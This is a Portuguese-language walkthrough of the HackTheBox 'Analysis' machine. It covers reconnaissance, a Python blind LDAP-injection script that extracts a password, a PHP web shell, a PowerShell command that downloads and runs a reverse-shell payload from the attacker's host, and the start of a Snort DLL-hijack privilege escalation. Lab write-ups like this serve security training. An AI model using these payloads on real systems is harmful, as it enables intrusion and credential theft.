---
title: "Analysis - HackTheBox"
date: 2024-01-24
published: true
lang: pt-BR
translation_key: "analysis-htb"
original_url: /analysis-htb
permalink: /pt-br/analysis-htb
---
# [](#intro)Introdução

Vamos resolver outra máquina de HackTheBox temporada 4: Análise. Esta caixa é classificada como Hard, então aperte o cinto e prepare-se para a batalha!


# [](#approach)Approach mindset

Para nossa mentalidade de abordagem, vamos separá-la como os seguintes passos:

1. Reconhecimento
2. Obtendo apoio
3. Enumeração do sistema
4. Aumento do privilégio


# # [](#step1-recon)Passo 1 - Reconhecimento

Vamos começar enumerando as portas abertas TCP da máquina com Nmap:

```bash
$ sudo nmap -p- -A -oN ports.nmap --min-rate 1000 -T4 10.129.33.58
# Nmap 7.94 scan initiated Sun Jan 21 20:09:39 2024 as: nmap -p- -A -oN ports.nmap --min-rate 1000 -T4 10.129.33.58
Nmap scan report for 10.129.33.58
Host is up (0.13s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-21 23:13:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94%I=7%D=1/21%Time=65AD7A58%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(RTSPRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0
SF:\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x2
SF:0message\"\x05HY000")%r(TerminalServerCookie,9,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Kerberos,9,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(FourOhFourRequest,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x
SF:08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(LDAPBindReq,46
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x88'\x1a\*Parse
SF:\x20error\x20unserializing\x20protobuf\x20message\"\x05HY000")%r(SIPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Not
SF:esRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x
SF:1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,
SF:32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inv
SF:alid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(giop,9,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/21%OT=53%CT=1%CU=38916%PV=Y%DS=2%DC=T%G=Y%TM=65AD7AA
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=103%GCD=2%ISR=107%TI=I%CI=RD%II=I%SS=S%TS=U)OPS(O1=M53CNW8NNS%O
OS:2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)WIN(W1=FF
OS:FF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5
OS:3CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q
OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD
OS:=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h02m30s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-01-21T23:14:40
|_  start_date: N/A

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   129.49 ms 10.10.14.1
2   129.54 ms 10.129.33.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 21 20:12:21 2024 -- 1 IP address (1 host up) scanned in 162.35 seconds
```
Podemos ver um monte de serviços, mas os que são interessantes para mim à primeira vista são os portos 53, 80, 88 e 389. Se tentarmos acessar o site, temos um 404.

Vamos mudar a nossa atenção para outros serviços por enquanto. Eu decidi executar o Nmap novamente o script `ldap* and not brute` para ver se podemos encontrar o nome de domínio e outras informações úteis.

```bash
$ sudo nmap --script "ldap* and not brute" -oN ldap-enum.txt 10.129.33.58
[...snip...]
,DC=analysis,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=analysis,DC=htb
|       namingContexts: DC=analysis,DC=htb
|       namingContexts: CN=Configuration,DC=analysis,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=analysis,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=analysis,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=analysis,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 377005
|       dsServiceName: CN=NTDS Settings,CN=DC-ANALYSIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=analysis,DC=htb
|       dnsHostName: DC-ANALYSIS.analysis.htb
|       defaultNamingContext: DC=analysis,DC=htb
|       currentTime: 20240122225140.0Z
|_      configurationNamingContext: CN=Configuration,DC=analysis,DC=htb
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
[...snip...]
```
Como podemos ver, o DC para isso é `analysis.htb`. Talvez a razão pela qual o navegador não foi capaz de buscar o site através do endereço IP é porque este nome de domínio deve ser adicionado ao `/etc/hosts`. Vamos adicionar ao `sudo vim /etc/hosts` e adicionar `<machine-ip> analysis.htb` no final do arquivo. Depois disso, vamos tentar acessar a página novamente:

<img src="../figs/analysis01.png" alt="analysis homepage">

Está bem! Este parece um bom site. No entanto, eu não encontrei nada de útil dentro da página ou DOM, então eu decidi enumerar com `ffuf`. Sem sucesso, tentei passar para outro método de enumeração. Como a porta 53 está aberta, podemos ser capazes de encontrar subdomínios associados ao serviço de nome `analysis.htb`. Para isso, eu corri `gobuster` com a bandeira DNS:

```bash
$ gobuster dns -d analysis.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r analysis.htb:53
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     analysis.htb
[+] Threads:    10
[+] Resolver:   analysis.htb:53
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.analysis.htb

Found: internal.analysis.htb

Found: gc._msdcs.analysis.htb

Found: domaindnszones.analysis.htb

Found: forestdnszones.analysis.htb
                                                                                                  
Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
===============================================================
```
Como podemos ver, existem alguns subdomínios disponíveis para nós. Antes de tentar acessá-los, devemos adicioná-los ao arquivo `/etc/hosts` assim: `<machine-ip> analysis.htb internal.analysis.htb domaindnszones.analysis.htb forestdnszones.analysis.htb ...`. Depois disso, vamos examinar `internal.analysis.htb`:

<img src="../figs/analysis02.png" alt="internal homepage">

Como podemos ver, esta página está inacessível por enquanto. Mas isso não significa que não sejamos capazes de enumerar este subdomínio para outros objetivos. Por essa razão, eu decidi executar `ffuf` para encontrar possíveis objetivos:

```bash
$ ffuf -u http://internal.analysis.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

Users                   [Status: 301, Size: 170, Words: 9, Lines: 2, Duration: 136ms]
dashboard               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 139ms]
\                       [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 149ms]
employees               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 135ms]
```
Como podemos ver, existem alguns terminais interessantes que podem ter escondido maneiras no web-service. Após algumas tentativas falhadas, eu decidi adicionar `.php` extensão no final dos endpoints e obtive alguns resultados interessantes. Começando com o endpoint `/Users/`, temos:

```bash
$ ffuf -u http://internal.analysis.htb/users/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

list.php                [Status: 200, Size: 17, Words: 2, Lines: 1, Duration: 173ms]
```
Acessando a página, temos:

<img src="../figs/analysis-internal1.png">

Parece que a página está esperando um parâmetro GET na solicitação. Para isso, vamos tentar encontrar qual é o parâmetro correto com um script bash:

```bash
#!/bin/bash

WORDLIST_PATH="/usr/share/wordlists/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt"

if [[ ! -f "$WORDLIST_PATH" ]]; then
        echo "Wordlist file does not exist at $WORDLIST_PATH"
        exit 1
fi

while IFS= read -r line; do
        echo "Testing parameter name '$line'..."
        res=$(curl -s "http://internal.analysis.htb/Users/list.php?$line")
        if [[ $res != *"missing parameter"* ]]; then
                echo "Parameter found: $line"
                exit 0
        fi
done < "$WORDLIST_PATH"
```
Isto irá loke para respostas diferentes passando diferentes nomes de parâmetros para ele. Depois de executá-lo, descobrimos que o nome do parâmetro é `name`:

```bash
$ ./find-param.sh
[...snip...]
Testing parameter name 'embedded'...
Testing parameter name 'enc_user'...
Testing parameter name 'f'...
Testing parameter name 'fiatId'...
Testing parameter name 'format'...
Testing parameter name 'full_text'...
Testing parameter name 'href'...
Testing parameter name 'id'...
Testing parameter name 'id_type'...
Testing parameter name 'include'...
Testing parameter name 'k4'...
Testing parameter name 'k'...
Testing parameter name 'keyURL'...
Testing parameter name 'language'...
Testing parameter name 'limit'...
Testing parameter name 'list'...
Testing parameter name 'list_id'...
Testing parameter name 'lon'...
Testing parameter name 'm4'...
Testing parameter name 'name'...
Parameter found: name
```
Acessando a página, encontramos isto:

<img src="../figs/analysis03.png" alt="parameter name on list.php">

Depois de bisbilhotar com este parâmetro, não tenho nada. Assim, decidi passar para outro ponto final. Como o endpoint `/dashboard` está nos dando Access Negado, vamos enumerar o endpoint `/employees` com `ffuf`.

```bash
$ ffuf -u http://internal.analysis.htb/employees/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -e .php   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/employees/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 182ms]
```
E encontrámos uma página de login!

<img src="../figs/analysis04.png" alt="login page">

Precisamos de um par de credenciais para fazer login. Vamos mudar para outro serviço e ver se podemos vazar algo útil. Note que temos Kerberos em execução, o que significa que podemos usar `kerbrute` para encontrar e-mails válidos. Os e-mails internos usados aqui devem ser `@analysis.htb`. Vamos correr.

```bash
$ cat /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt possible-usernames.txt | sed "s|$|@analysis.htb|" > emails-wl.txt
```
Agora, corremos kerbrute:

```bash
$ kerbrute userenum -d analysis.htb emails-wl.txt --dc analysis.htb
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/22/24 - Ronnie Flathers @ropnop

2024/01/22 20:37:53 >  Using KDC(s):
2024/01/22 20:37:53 >   analysis.htb:88

2024/01/22 20:39:23 >  [+] VALID USERNAME:       jdoe@analysis.htb
2024/01/22 20:40:45 >  [+] VALID USERNAME:       ajohnson@analysis.htb
2024/01/22 20:43:40 >  [+] VALID USERNAME:       cwilliams@analysis.htb
2024/01/22 20:45:00 >  [+] VALID USERNAME:       wsmith@analysis.htb
2024/01/22 20:49:41 >  [+] VALID USERNAME:       jangel@analysis.htb
2024/01/22 21:10:10 >  [+] VALID USERNAME:       technician@analysis.htb
2024/01/22 21:28:24 >  [+] VALID USERNAME:       JDoe@analysis.htb
2024/01/22 21:29:38 >  [+] VALID USERNAME:       AJohnson@analysis.htb
2024/01/22 22:50:34 >  [+] VALID USERNAME:       badam@analysis.htb

```
Como podemos ver, existem vários nomes de usuário válidos. Vamos voltar ao endpoint `/Users` e passar esses nomes de usuário (sem a parte de e-mail `@analysis.htb`) e ver se conseguimos recuperar a senha de alguém. Após um monte de tentativas, vemos que o nome `technician` sob o e-mail `technician@analysis.htb` dá uma resposta diferente:

<img src="../figs/analysis05.png" alt="valid user">

No entanto, nada de muito interessante aparece aqui. Poderíamos tentar usar a senha usando kerbrute, mas eu tentei com listas de palavras enormes e nada foi encontrado. Deve haver outra maneira de obter a senha deste usuário...

Tentei enviar cargas de injeção SQL, mas sem sucesso. Então, depois de um longo período de pesquisa, encontrei (e aprendi) esta nova técnica de injeção: injeções de LDAP. Algumas aplicações web servem como pontes para o serviço LDAP, e eles também podem ser propensos à injeção! Eu encontrei [esta lista de palavras](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt), que continha diferentes tipos de cargas. O primeiro, um simples asterisco `*`, mostrou que o parâmetro `name` foi de fato usado para consultar LDAP:

<img src="../figs/analysis1.png" alt="ldap injection test">

Depois de um pouco mais de pesquisa, descobri que a carga útil `name=<username>)(%26(objectClass=user)(description=*)` pode ser usada para enumerar os caracteres possíveis da senha do usuário. Tudo o que precisamos fazer é passar caracteres no `(description=<pwd-char>*)`. Se o caractere é um palpite correto, então a página retornaria o mesmo que se passássemos `name=<username>` sozinho. Este é um ataque de injeção cego LDAP, como temos que adivinhar sem realmente ter a senha para ser impresso para nós no corpo da página.

Como exemplo, vejamos a seguinte resposta para a carga útil `name=technician)(%26(objectClass=user)(description=9*)` contra `name=technician)(%26(objectClass=user)(description=7*)`.

<img src="../figs/analysis07.png" alt="invalid payload">

<img src="../figs/analysis06.png" alt="valid payload">

Como podemos ver, porque temos uma resposta de volta com o campo Primeiro Nome contendo `technician` quando passamos o 9 em vez de 7, concluímos que o número 9 é o primeiro caractere do usuário `technician`!

Certo, vamos automatizar o processo de teste de caracteres usando um script Python. No entanto, há uma pegada: o caractere asterisco `*` tem um significado especial em consultas LDAP, representando um wildcard. Isso apresenta um desafio se o personagem faz parte da senha, pois nossa consulta pode não interpretá-la corretamente. Por exemplo, se a senha é `abc\*123\*!@#`, nosso script pode adivinhar corretamente até abc, mas ele vai lutar para identificar o * devido ao seu significado especial em LDAP. Para resolver isso, o script opera em rodadas. Testa os caracteres sequencialmente até esgotar a sua lista. Se não pode progredir mais, o script tenta um login, assumindo que o próximo caractere pode ser um asterisco. Se o login falhar, ele confirma a presença de um * e prossegue para a próxima rodada. Este processo repete até que o script deduza com sucesso toda a senha. O script está disponível [here](https://github.com/alexbsec/analysis-htb/blob/master/ldapinject.py).

```python
import requests
import urllib.parse
import string
import time

def try_login(url, email, password):
    data = {
        'username':email,
        'password':urllib.parse.unquote_plus(password),
        'login':'Login'
    }

    res = requests.post(url, data=data)
    if "Wrong Data" in res.text:
        return False

    return True

def test_payload(url, char, found_chars):
    modified_url = url.replace("{FUZZ}", urllib.parse.quote_plus(char)).replace("{found_char}", found_chars)
    print(f"Testing {char} for URL: {modified_url}")
    try:
        res = requests.get(modified_url)
        if res.status_code == 200 and "technician" in res.text:
            return True
    except requests.RequestException as e:
        print(f"Request failed: {e}")
    return False

def do_loop(url, wl, found_chars):
    for char in wl:
        char = char.strip()
        if test_payload(url, char, found_chars):
            print(f"Found char: {char}. Resetting iteration")
            found_chars += char
            return do_loop(url, wl, found_chars)
    return found_chars

def main():
    url = "http://internal.analysis.htb/Users/list.php"
    login_url = "http://internal.analysis.htb/employees/login.php"
    email = "technician@analysis.htb"
    password = ""
    max_rounds = int(input("How many rounds? "))

    wl = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*()_+=-"
    param = "?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
    base_url = url + param
    
    rounds = 1
    while rounds <= max_rounds:
        password = do_loop(base_url, wl, password)
        print(f"[*] Round {rounds} password is: '{password}'. Attempting login...")
        can_login = try_login(login_url, email, password)
        time.sleep(3)
        if can_login:
            print(f"[+] Login successful!")
            break
        print(f"[-] Round {rounds} login attempt failed with password '{password}'")
        print(f"[*] Starting round {rounds+1} assuming next character in password is '*'")
        rounds += 1
        password += "%2A"
    

    password = urllib.parse.unquote_plus(password)
    print(f"[+] Password is: '{password}'")

    return 0

if __name__ == '__main__':
    status = main()
    exit(status)
```
Aqui está a saída:

```bash
$ python ldapinject.py
How many rounds? 2
[...snip...]
Testing @ for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%40*)
Testing # for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%23*)
Testing $ for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%24*)
Testing % for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%25*)
Testing ^ for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%5E*)
Testing & for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%26*)
Testing * for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%2A*)
Testing ( for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%28*)
Testing ) for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%29*)
Testing _ for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv_*)
Testing + for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%2B*)
Testing = for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%3D*)
Testing - for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv-*)
[*] Round 2 password is: '<redacted>'. Attempting login...
[+] Login successful!
[+] Password is: '<redacted>'
```
Com a senha à nossa disposição, podemos entrar na interface de administração:

<img src="../figs/analysis08.png" alt="admin interface">


## [](#step3-foothold)Passo 2 - Obtendo apoio


Pesquisando um pouco, encontramos uma funcionalidade de upload no `/dashboard/form.php`. Como o site parece estar renderizando PHP, vamos carregar um script PHP contendo o seguinte:

```php
<?php
echo '<h1>hi mom</h1>';
?>
```
<img src="../figs/analysis09.png" alt="first upload response">

Como podemos ver pela resposta, o arquivo foi carregado. Agora, precisamos encontrar o ponto final onde os uploads são armazenados. Vamos usar o `ffuf` para encontrá-lo:

```bash
 $ ffuf -u http://internal.analysis.htb/dashboard/FUZZ -w usr/share/wordlists/dirbuster/directory-list-1.0.txt -s
img
uploads
```
Como podemos ver, está localizado no `/dashboard/uploads`. Acessando a página sob o nome do arquivo que enviamos:

<img src="../figs/analysis10.png" alt="uploaded php page">

Uma vez que esta é uma máquina do Windows, vamos primeiro carregar uma shell web e obter uma shell reversa a partir dela. Para isso, usaremos o seguinte script PHP:

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
Depois de enviá-lo sob o nome de concha.php e acessá-lo, encontramos a seguinte página:

<img src="../figs/analysis11.png" alt="web-shell">

Podemos testar nossa web-shell enviando o comando `whoami`:

<img src="../figs/analysis12.png" alt="whoami in webshell">

Ok, agora precisamos de um escudo reverso para alimentar este campo de forma. Primeiro, vamos baixar [este](https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1) PowerShell reverter código shell em nossa máquina local e salvá-lo em `shell-payload.ps1`. Mude tudo o que for necessário lá, como seu endereço IP e porta. Agora abrimos um servidor Python onde salvamos a carga útil com

```bash
python3 -m http.server 2323
```
Finalmente, usamos este comando powershell como promp para nossa web-shell: `powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<your-ip>:2323/shell-payload.ps1')"`. Antes de executá-lo, abrimos um novo ouvinte netcat na porta que passamos na carga útil `shell-payload.ps1`.

<img src="../figs/analysis13.png" alt="rev-shell">

E nós temos o shell inverso como a conta do Web service!


## [](#step3-crafting-the-attack)Passo 3 - enumeração do sistema

Vamos carregar PrivescCheck.ps1 (você pode encontrá-lo [aqui](https://github.com/itm4n/PrivescCheck)) usando a funcionalidade de upload dentro do site. Então, podemos simplesmente executá-lo dentro da shell digitando `. .\PrivescCheck.ps1; Invoke-PrivescCheck`. Então encontraremos um par de credenciais que podem ser usadas para fazer login como um usuário `jdoe`:

<img src="../figs/analysis14.png" alt="creds">

Vamos usar Evil-WinRM para se conectar com este usuário e gerar uma shell mais estável:

```bash
$ evil-winrm -i 10.129.223.1 -u jdoe -p <redacted>

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jdoe\Documents> whoami
analysis\jdoe

*Evil-WinRM* PS C:\Users\jdoe\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\jdoe\Desktop> ls


    Directory: C:\Users\jdoe\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/23/2024  10:33 PM             34 user.txt


*Evil-WinRM* PS C:\Users\jdoe\Desktop> cat user.txt
71d78169aa06bb5f7d5b1e6fd7babd81
```
Agora que estamos dentro, vamos dar uma olhada novamente no `PrivescCheck.ps1`. Depois de alguns gregos aqui e ali, encontrei estas linhas:

<img src="../figs/analysis15.png" alt="snort svc">

Depois de algumas pesquisas, eu encontrei [este](https://www.cvedetails.com/cve/CVE-2016-1417/) CVE sobre sequestro de dll. Nesta exploração, um atacante colocaria código arbitrário sob tcapi.dll e executaria `snort.exe` para abrir qualquer arquivo pcap. Infelizmente, isso não funcionou. Tive de ir mais fundo...

Durante a minha pesquisa, encontrei [esta referência](https://www.spencerdrayton.co.uk/blog/snort-custom-dynamic-preprocessor/) dizendo que o snort usa pré-processadores dinâmicos para várias tarefas de análise de tráfego de rede. Estes pré-processadores são carregados dinamicamente em tempo de execução a partir do diretório snort dynamicpreprocessor.

